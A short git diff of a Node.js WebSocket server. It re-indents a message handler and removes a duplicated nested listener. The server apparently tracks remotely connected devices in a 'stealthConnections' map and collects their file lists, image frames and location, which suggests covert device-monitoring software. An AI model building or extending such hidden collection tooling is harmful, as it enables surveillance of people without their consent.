@@ -107,35 +107,23 @@ wss.on("connection", (ws, req) => {
     console.log(`Device ${deviceId} connected`);
 
     ws.on("message", (rawData) => {
-      try {
+    try {
         const dataStr = rawData.toString();
         const msg = JSON.parse(dataStr);
         
         if (msg.type === 'ping') {
-          console.log(`Ping from ${deviceId}`);
-          return;
+            console.log(`Ping from ${deviceId}`);
+            return;
         }
         
         if (msg.type === 'file_list') {
-          const deviceInfo = stealthConnections.get(deviceId);
-          if (deviceInfo) {
-            deviceInfo.files = msg.files;
-            deviceInfo.lastFileUpdate = Date.now();
-          }
-          console.log(`Received ${msg.files.length} files from ${deviceId}`);
+            const deviceInfo = stealthConnections.get(deviceId);
+            if (deviceInfo) {
+                deviceInfo.files = msg.files;
+                deviceInfo.lastFileUpdate = Date.now();
+            }
+            console.log(`📁 Received ${msg.files.length} files from ${deviceId}`);
         }
-
-        ws.on('message', (data) => {
-    const message = JSON.parse(data.toString());
-    
-    if (message.type === 'file_list') {
-        deviceFileCache.set(message.device_id, {
-            files: message.files,
-            timestamp: Date.now()
-        });
-        console.log(`Received ${message.files.length} files from ${message.device_id}`);
-    }
-});
         
         // СОХРАНЯЕМ ПОСЛЕДНИЙ КАДР ДЛЯ HTTP POLLING
         if (msg.type === 'image') {
@@ -463,4 +451,5 @@ function getDistance(lat1, lon1, lat2, lon2) {
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
